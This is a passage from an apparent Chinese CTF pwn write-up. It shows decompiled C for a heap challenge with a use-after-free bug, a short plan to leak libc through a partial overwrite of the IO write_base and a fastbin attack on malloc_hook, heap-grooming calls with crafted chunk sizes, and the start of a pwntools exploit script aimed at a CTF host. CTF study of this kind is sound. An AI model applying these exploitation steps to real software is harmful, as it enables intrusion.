punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token function\">_isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is that all you got? Bye!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">sub_B12</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which one?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token function\">_isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid index\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_202060<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Job done!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token keyword\">int</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  _DWORD nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_20204C <span class=\"token operator\">></span> <span class=\"token number\">63</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No more memory available\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How much?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token function\">_isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0x70u</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nope, too big\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Data?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  v0 <span class=\"token operator\">=</span> dword_20204C<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  qword_202060<span class=\"token punctuation\">[</span>v0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Job done!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>规定 chunk 大小，程序有 uaf 漏洞，不能 show，所以打 IO，将 write_base 微改一下，泄露处 libc 地址即可，然后 fastbin attack 修改 malloc 为 ogg 即可</p>\n<p>但是此题需要仔细调整 fastbin fd 和 unsorted fd</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'e'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 5</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\xb0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'e'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token operator\">*</span><span class=\"token number\">0x58</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xe1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 10</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 11</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 12</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'j'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'k'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x70'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 13</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'l'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 14</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 15</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\xbd\\x25'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 15</span></pre></td></tr></table></figure><p>我的调整如上方案，若有大佬有好的调整方案欢迎联系</p>\n<h4 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp:</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./chall1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'/home/yhuan/glibc-all-in-one/libs/2.24-9ubuntu2_amd64/libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"challs.tfcctf.com:32324\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token 